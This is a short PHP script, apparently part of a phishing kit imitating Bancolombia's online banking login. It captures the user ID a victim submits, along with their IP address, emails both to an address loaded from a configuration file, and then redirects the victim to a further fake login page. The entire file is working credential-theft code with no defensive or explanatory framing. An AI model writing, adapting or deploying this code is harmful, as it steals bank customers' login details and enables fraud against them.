<?
$ip = getenv("REMOTE_ADDR");


$mensaje = "Usuario: ".$_POST['userId']."\n";


@include "configuracion.php";

$asunto = "usuario BANCOLOMBIA (".$ip.")";
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: usuario <".$_SERVER['HTTP_HOST'].">";
mail($retorno, $asunto, $mensaje, $headers);
header('Location: ../1/olb/Init.php');
?>